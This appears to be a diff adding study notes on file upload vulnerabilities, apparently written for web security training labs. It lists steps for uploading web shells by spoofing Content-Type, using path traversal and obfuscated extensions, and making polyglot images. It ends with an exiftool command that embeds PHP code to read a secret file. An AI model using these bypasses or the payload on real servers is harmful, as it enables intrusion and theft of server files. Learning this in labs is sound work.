@@ -1,0 +1,61 @@
+File upload vulnerabilities:
+
+https://www.baeldung.com/linux/file-mime-types
+https://book.hacktricks.xyz/pentesting-web/file-upload
+https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass
+https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt
+
+Let’s see some other common MIME types:
+multipart/form-data
+text/xml
+text/csv
+text/plain
+application/xml
+application/zip
+application/pdf
+
+xdg-mime query filetype name.ext
+file --mime-type name.ext
+
+Lab: Remote code execution via web shell upload
+--> First login an account and find upload option
+--> try to upload php file 
+--> if file upload successfully.exploit it
+
+Lab: Web shell upload via Content-Type restriction bypass
+--> First login an account and find upload option
+--> try to upload php file 
+--> if donot upload try to change Content-Type : image/jpeg
+--> Then if upload successfully then BHOOM
+
+Lab: Web shell upload via path traversal
+--> First login an account and find upload option
+--> try to upload php file 
+--> try to path traversal and URL encoding also
+--> if upload successfully then exploit it
+
+path Traversal:
+../
+/../
+../../
+/../../
+../../../
+/../../../
+
+Lab: Web shell upload via obfuscated file extension
+--> First login an account and find upload option
+--> try to upload php file 
+--> if php not upload try to x.php.jpg or x.php%00.jpg
+--> if upload then exploit
+
+Lab: Remote code execution via polyglot web shell upload
+https://en.wikipedia.org/wiki/List_of_file_signatures
+--> First login an account and find upload option
+--> try to upload php file 
+--> if dont upload intercept it and edit the request
+--> go to file sign and try to img or gif ISO
+--> then try to execute it
+
+or try to this method 
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+
